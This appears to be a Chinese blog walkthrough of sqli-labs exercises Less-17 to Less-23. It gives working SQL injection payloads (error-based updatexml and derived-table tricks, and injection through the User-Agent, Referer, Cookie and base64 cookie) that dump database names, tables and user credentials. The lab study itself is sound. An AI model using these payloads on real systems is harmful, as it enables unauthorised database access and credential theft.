+<p><code>uname=admin&amp;passwd=&#39; or (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvryRg.png" alt="kvryRg.png"></p>
+<p>使用<strong>派生表</strong>时，错误信息能返回我们想要的数据。</p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2)) as a from information_schema.tables group by a)b) where  username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvyCNV.png" alt="kvyCNV.png"></p>
+<p>在下一步之前，我们先理清<a target="_blank" rel="noopener" href="https://www.yiibai.com/mysql/subquery.html">子查询</a>与<a target="_blank" rel="noopener" href="https://www.yiibai.com/mysql/derived-table.html">派生表</a>。</p>
+<p><strong>子查询与派生表</strong></p>
+<blockquote>
+<p>子查询有两种：一是<strong>WHERE子句中</strong>的子查询；二是<strong>FROM子句中</strong>的子查询，这种子查询又被称为<strong>派生表</strong>。</p>
+</blockquote>
+<ul>
+<li><strong>WHERE子句中：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name IN (SELECT column_name</span><br><span class="line">                      FROM table_name</span><br><span class="line">                      WHERE condition)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>FROM子句中：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name</span><br><span class="line">FROM (SELECT column_name</span><br><span class="line">      FROM table_name</span><br><span class="line">      WHERE condition) derived_table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这两种实际上<strong>并无区别</strong>！</p>
+<p>只是在<strong>Less-5</strong>中<code>select</code>查询返回的字段数为<strong>3</strong>，足够在<code>column_list</code>中将<code>count()</code>和<code>concat()</code>都包含进去，所以用<strong>CONCAT子查询</strong>更简单。</p>
+<p>而在<strong>Less-17</strong>中<code>update</code>查询返回的字段数只有<strong>1</strong>！不足以使<code>count()</code>后接上<code>concat()</code>这样一个查询语句，这时候就只能通过<strong>派生表</strong>再将上一层子查询包裹起来，通过<code>select 1 from (报错的CONCAT子查询) derived_table_name</code>使注入查询的字段与<code>update</code>查询的字段数相等！</p>
+<p>（严格来说，这里已经不能叫双注入而是三注入了，都称为子查询注入）</p>
+<p><strong>所以，子查询注入重点在于控制子查询使涉及字段数相等。select使用union，update/delete/insert使用or。而CONCAT子查询或是派生表只是手段。</strong></p>
+<h4 id="派生表注入过程"><a href="#派生表注入过程" class="headerlink" title="派生表注入过程"></a>派生表注入过程</h4><p><strong>爆库</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kv6pKH.png" alt="kv6pKH.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kv6HSS.png" alt="kv6HSS.png"></p>
+<p>一直没成功<strong>Subquery returns more than 1 row</strong>子查询返回多行</p>
+<p>于是用limit来限制范围，一条一条的来查询，结果一直找不到limit放的位置，以后在研究吧。</p>
+<p><strong>爆字段</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+</code></p>
+<p>这个也一样<strong>Subquery returns more than 1 row</strong></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(**select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1**),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvfusU.png" alt="kvfusU.png"></p>
+<p>不知道为啥开始也报了几次<strong>Subquery returns more than 1 row</strong>，多提交了几次就可以了。</p>
+<h4 id="updatexml-注入"><a href="#updatexml-注入" class="headerlink" title="updatexml()注入"></a>updatexml()注入</h4><p> updatexml()函数</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_target,xpath_expr,new_xml)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml_target</td>
+<td>目标xml，形式类似于节点目录</td>
+</tr>
+<tr>
+<td>xpath_expr</td>
+<td>xml的表达式（xpath格式）</td>
+</tr>
+<tr>
+<td>new_xml</td>
+<td>用来替换的xml</td>
+</tr>
+</tbody></table>
+<p><code>updatexml()</code>函数是MySQL对xml文档数据进行查询和修改的xpath函数。</p>
+<p>简单来说就是，用<code>new_xml</code>把<code>xml_target</code>中包含<code>xpath_expr</code>的部分节点（包括<code>xml_target</code>）替换掉。</p>
+<p>如：updatexml(<a><b><c>asd</c></b><e></e></a>, ‘//b’, <f>abc</f>)，</p>
+<p>运行结果：<a><f>abc</f><e></e></a>，</p>
+<p>其中’//b’的斜杠表示不管b节点在哪一层都替换掉，而’/b’则是指在根目录下替换，此处xml_target的根目录节点是a。</p>
+<p>注入原理</p>
+<p><code>updatexml()</code>的<code>xml_target</code>和<code>new_xml</code>参数随便设定一个数，这里主要是利用报错返回信息。利用<code>updatexml()</code>获取数据的固定payload是：</p>
+<blockquote>
+<p><code>... or updatexml(1,concat(&#39;#&#39;,(select * from (select ...) a)),0) ...</code></p>
+</blockquote>
+<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><p><strong>爆库</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0)--+</code></p>
+<p><code>&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)#</code>     0x7e表示~</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxeqgJ.png" alt="kxeqgJ.png"></p>
+<p><strong>注意：</strong>因为<code>xpath_expr</code>是xpath格式，所以不是所有字符都可以作为<code>concat()</code>的连接符，如<code>-</code>、<code>@</code>便不可以。</p>
+<p><strong>爆表</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxm8rn.png" alt="kxm8rn.png"></p>
+<p><strong>注意：</strong>这里不要用<code>concat_ws()</code>，会有未知错误使错误回显显示不全。</p>
+<p><strong>爆列</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxnmLR.png" alt="kxnmLR.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select concat(id,&#39;#&#39;,username,&#39;#&#39;,password) from users limit 0,1)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxn6yj.png" alt="kxn6yj.png"></p>
+<p>报错，<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>&gt;您无法在FROM子句中为更新指定目标表’users’</p>
+<p>意思是不能先<code>select</code>表中的某些值，再<code>update</code>这个表（在同一语句中）。</p>
+<p><strong>解决方法：</strong>将<code>select</code>出的结果作为<strong>派生表</strong>再<code>select</code>一遍，这样就规避了错误。</p>
+<p><strong>注意：</strong>此问题只出现于MySQL，msSQL和Oracle不会出现此问题。</p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxuEAP.png" alt="kxuEAP.png"></p>
+<p><strong>注意：</strong>这里的错误信息只显示了一部分，所以没有一次性输出所有数据（可以做到），而使用<code>limit</code>偏移注入。</p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c876a7f96eb5">原文链接</a></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="https://s2.ax1x.com/2019/03/07/kxMdT1.png" alt="kxMdT1.png"></p>
+<p>尝试了很多次之后，发现回显能够显示你的IP地址，看一下源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>源码使用<code>HTTP_USER_AGENT</code>只获取了HTTP请求头的一个部分：<code>User-Agent</code>。<br> 而获取IP则使用了<code>REMOTE_ADDR</code>，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。</p>
+<p>再看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>对POST的<code>uname</code>和<code>passwd</code>都做了<code>check_input()</code>处理，在Less-17已经分析了这个函数，所以表单不存在注入点。</p>
+<p>不论是否登录成功，都会回显<code>IP</code>。<br> 登陆成功后回显<code>uagent</code>，并将<code>uagent</code>、<code>IP</code>、<code>uname</code>插入到<code>security</code>数据库的<code>uagents</code>表的<code>uagent</code>、<code>ip_address</code>、<code>username</code>三个字段中。</p>
+<p>用已知的用户名登陆一下，并且测试一下X-Forwarded-For和User-Agent</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxQCX4.png" alt="kxQCX4.png"></p>
+<p>经过这次尝试可以看到：修改XFF头对IP没有影响，登陆成功会回显你的<code>User-Agent</code>。<br> 这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。这跟现实中的注册登录再注入是比较贴合。</p>
+<p>所以注入点就在<code>User-Agent</code>处。</p>
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>这里我们仍需要根据回显报错来判断<code>INSERT</code>语句结构，首先任意尝试：</p>
+<p><code>User-Agent: Hyafinthus&#39; updatexml(1,concat(&#39;#&#39;,(database())),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxQQnH.png" alt="kxQQnH.png"></p>
+<p>源码中</p>
+<blockquote>
+<p>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
+</blockquote>
+<p>可以看到<code>uagent</code>是在<code>IP</code>和<code>uname</code>之前的</p>
+<p><strong>爆库</strong></p>
+<p><code>User-Agent: Specter&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0),&#39;&#39;,&#39;&#39;)#</code></p>
+<p><code>User-Agent: Specter&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1551947686682.png" alt="1551947686682"></p>
+<p><strong>注意：</strong>这里并不是URL而是HTTP头，所以<code>+</code>并不会被转义为<code>(空格)</code>，于是末尾的注释符号要变为<code>#</code>。</p>
+<p><strong>爆表</strong></p>
+<p><code>User-Agent: Specter&#39; and updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;,&#39;&#39;)#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxto9A.png" alt="kxto9A.png">试了一下<strong>and</strong>也行</p>
+<p><strong>爆列</strong></p>
+<p><code>User-Agent: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;,&#39;&#39;)#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxtBtJ.png" alt="kxtBtJ.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>User-Agent: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;,&#39;&#39;)#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxtOHS.png" alt="kxtOHS.png"></p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>登录后，回显Referer信息，</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxNkHU.png" alt="kxNkHU.png"></p>
+<p>登录成功后发现回显的是<code>Referer</code>不是<code>User-Agent</code>，判断<code>INSERT</code>语句结构：</p>
+<p><code>Referer: Specter&#39; updatexml(1,concat(&#39;#&#39;,(database())),0)#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxNhrV.png" alt="kxNhrV.png"></p>
+<p>应该是表的结构变了，查看源码，只有<code>referer</code>和<code>IP</code></p>
+<blockquote>
+<p>insert=”INSERT INTO <code>security</code>.<code>referers</code> (<code>referer</code>, <code>ip_address</code>) VALUES (‘$uagent’, ‘$IP’)”;</p>
+</blockquote>
+<p>知道了表的结构就可已注入了。</p>
+<h4 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h4><p><strong>爆库</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(database())),0),&#39;&#39;)#</code></p>
+<p><strong>爆表</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0),&#39;&#39;)#</code></p>
+<p><strong>爆表</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;)#</code></p>
+<p><strong>爆内容</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;)#</code></p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>原文：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f77ab78dcd35">https://www.jianshu.com/p/f77ab78dcd35</a></p>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>登录失败</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxUPGd.png" alt="kxUPGd.png"></p>
+<p>登录成功</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxUiRA.png" alt="kxUiRA.png"></p>
+<ul>
+<li>回显有<code>User-Agent</code>、<code>IP</code>这样从当次<code>Request</code>直接获取的，</li>
+<li>也有<code>Cookie</code>这样刷新页面后仍存在的，</li>
+<li>还有登录用户的<code>id</code>、<code>username</code>、<code>password</code>。</li>
+<li>最下方是<code>删除Cookie</code>的按钮，点击后刷新到初始界面。</li>
+</ul>
+<p>使用Chrome插件<code>EditThisCookie</code>查看存储的<code>Cookie</code>信息：</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxRrZQ.png" alt="kxRrZQ.png"></p>
+<p>可以看到只存储了<code>uname</code>这一个字段的信息，且是明文存储。<br>修改<code>Cookie</code>后刷新界面：</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxWPJI.png" alt="kxWPJI.png"></p>
+<p>便可以得知整个后台流程：</p>
+<ol>
+<li>登陆后将<code>uname</code>写入<code>Cookie</code>。</li>
+<li>在每次<code>Request (GET / POST)</code>页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取<code>Cookie</code>中字段<code>uname</code>。</li>
+<li>在数据库中按<code>username</code>查询，若用户存在则将查询到用户<code>id</code>、<code>username</code>、<code>password</code>回显；若不存在…</li>
+</ol>
+<p>可以判断出注入点就在<code>Cookie</code>处，但是这里注入有两种途径：</p>
+<ol>
+<li>用Chrome插件<code>EditThisCookie</code>修改本地<code>Cookie</code>文件注入。</li>
+<li>用<code>Burp</code>修改登陆<code>(POST)</code>成功后刷新时<code>GET</code>请求头中的<code>Cookie</code>值注入，这种方式不会修改本地的<code>Cookie</code>文件。</li>
+</ol>
+<p>接下来将重点演示第一种途径的注入。</p>
+<h4 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h4><p>我们得出后台根据<code>Cookie</code>中的<code>uname</code>查询用户的所有信息，即这是个<code>SELECT</code>语句，我们可以使用最简单的<code>UNION</code>注入。</p>
+<p><code>uname=Dumb&#39;</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxfFAJ.png" alt="kxfFAJ.png"></p>
+<p><code>uname=Dumb&#39; order by 3#</code>回显正确，说明有三个字段。</p>
+<p><code>uname=1&#39; union select 1,2,3#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kx534J.png" alt="kx534J.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kx5PHS.png" alt="kx5PHS.png"></p>
+<p>猜测SQL语句，然后看下源码</p>
+<blockquote>
+<p>$sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;</p>
+</blockquote>
+<p><strong>爆库</strong></p>
+<p>uname=1’ union select 1,2,database()#`</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kx5lEF.png" alt="kx5lEF.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kx5uuV.png" alt="kx5uuV.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kx5Hvq.png" alt="kx5Hvq.png"></p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1551967451498.png" alt="1551967451498"></p>
+<p><strong>爆列</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxIJIg.png" alt="kxIJIg.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxIazn.png" alt="kxIazn.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(concat(&#39;-&#39;,id,username,password)) from users#</code></p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\1551967945603.png" alt="1551967945603"></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxIHFe.png" alt="kxIHFe.png"></p>
+<p>同样burpsuite也可以，</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxIqWd.png" alt="kxIqWd.png"></p>
+<p>总算把前20关写完了。多亏了<a target="_blank" rel="noopener" href="https://www.jianshu.com/u/f5a5bfa4f659">Hyafinthus</a>的题解。</p>
+<h2 id="Less-21-to-Less30"><a href="#Less-21-to-Less30" class="headerlink" title="Less-21 to Less30"></a>Less-21 to Less30</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>还是和上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，<code>uname=Dumb</code>变成了<code>uname = RHVtYg==</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/11/ACWTIO.png" alt="ACWTIO.png"></p>
+<p>很明显是将Dumb进行base64编码，可以在线测试一下，<a target="_blank" rel="noopener" href="https://base64.supfree.net/">base64</a>编码之后验证了确实是Dumb的base64编码，查看cookie之后，发现也是base64编码的，</p>
+<h4 id="注入-2"><a href="#注入-2" class="headerlink" title="注入"></a>注入</h4><p>开始注入，发现了一个问题，</p>
+<blockquote>
+<p>uname=Dumb’</p>
+<p><a target="_blank" rel="noopener" href="https://base64.supfree.net/">base64</a>在线加密<code>Dumb&#39;</code>后,即base64(Dumb’)=<code>RHVtYiUyNw==</code></p>
+</blockquote>
+<p>用这个值去修改cookie值之后，发现会有如下警告，猜测是base64最后的表示问题</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APvuIe.png" alt="APvuIe.png"></p>
+<p>所以，写一个简单的python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1=<span class="string">&quot;Dump&#x27;&quot;</span></span><br><span class="line">str2=base64.b64encode(str1)</span><br><span class="line"><span class="built_in">print</span>(str2)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>uname=Dumb’</p>
+<p>base64=RHVtcCc=</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxEWj.png" alt="APxEWj.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APvF2R.png" alt="APvF2R.png"></p>
+<p>直接得出 SQL 语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> table_name WHERE username=(<span class="string">&#x27;$cookie_uname&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>即单引号加括号闭合</p>
+<p><strong>爆库</strong></p>
+<p><code>uname=1&#39;) union select 1,2,database()#</code></p>
+<p><code>base64: RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxd0K.png" alt="APxd0K.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxDte.png" alt="APxDte.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>uname=1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=security&#39;#</code></p>
+<p><code>base64: RHVtYicpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9c2VjdXJpdHknIw==</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APzJUS.png" alt="APzJUS.png"></p>
+<p><strong>爆列</strong></p>
+<p><code>uname = 1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code></p>
+<p><code>base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lPSd1c2Vycycj</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiSJqx.png" alt="AiSJqx.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=1&#39;) union select 1,2,group_concat(concat_ws(&#39;-&#39;,id,username,password)) from user#</code></p>
+<p><code>base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbmNhdF93cygnLScsaWQsdXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzIw==</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiSdiD.png" alt="AiSdiD.png"></p>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p><code>uname=1&quot;</code>双引号闭合，其他和Less-21一样。</p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>作者：Hyafinthus</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2602430f8ee4">https://www.jianshu.com/p/2602430f8ee4</a></p>
+<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p><code>id=1&#39;</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/Aik3t0.png" alt="Aik3t0.png"></p>
+<p>可以看出是单引号闭合的查询，这里报错还把站点路径爆出来了。</p>
+<p>看了看源码，发现有preg_replace()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> preg_replace(pattern,replacement,subject[,limit=-1[,&amp;count]])</p>
+</blockquote>
+<p><code>preg_replace()</code>函数执行一个正则表达式的搜索和替换，搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p>
+<p>如果<code>subject</code>是一个数组，<code>preg_replace()</code>返回一个数组，其他情况下返回一个字符串。<br> 如果匹配被查找到，替换后的<code>subject</code>被返回，其他情况下返回没有改变的<code>subject</code>。如果发生错误，返回<code>NULL</code>。</p>
+<p>在这关中，也只是将<code>#</code>和<code>--</code>替换成了<code>空字符</code>。</p>
+<p>判断字段数时问题来了：尝试两种注释方式发现报错回显中<code>LIMIT</code>语句仍在起作用，注释没有起作用，即使把<code>#</code>URL编码为<code>%23</code>仍被过滤。</p>
+<p>这时就要分析 SQL 语句找到绕过注入的方式，后台的查询语句是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name WHERE id=&#x27;$id&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>注入点在<code>id</code>处，我们要判断字段数用的是<code>order by</code>子句，同时闭合第二个单引号：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=1’ order by 4 and ‘1’=’1 LIMIT 0,1</p>
+</blockquote>
+<p>本意是能从报错信息判断查询返回表共有几个字段，但是回显很正常：</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiVZp6.png" alt="AiVZp6.png"></p>
+<p>这是因为：</p>
+<blockquote>
+<p><code>where</code>与<code>order by</code>是子句，<code>and</code>是操作符，用于<code>where</code>子句。<br> 在MySQL的执行顺序中，<code>where</code>是远在<code>order by</code>前面的。</p>
+<p>在第一个查询语句中，<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code>作为<code>where</code>的条件，先被执行，得到结果集；然后是<code>order by</code>，因结果集中无第四个字段所以报错。</p>
+<p>在第二个查询语句中，<code>order by</code>在<code>where</code>的条件中，在<code>where</code>执行时被忽略了，结果集生成后并未再执行<code>order by</code>。</p>
+</blockquote>
+<p>所以这关不能用<code>order by</code>来判断字段数，而要用<code>union</code>：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=’<strong>1’ union select 1,2,3,4 or ‘1’=’1</strong>‘  LIMIT 0,1</p>
+</blockquote>
+<p>这里的<code>or</code>作为了联合查询第二个语句的条件而不是第一个语句<code>where</code>的条件。</p>
+<p><code>?id=1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1</code></p>
+<p>当<code>select</code>加到<code>4</code>时报错，得出共<code>3</code>个字段。</p>
+<p>注入时闭合查询语句即绕过过滤如下：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=’<strong>-1’ union [select c_1,c_2,(c_3] or ‘1’=’1</strong>‘)  LIMIT 0,1</p>
+</blockquote>
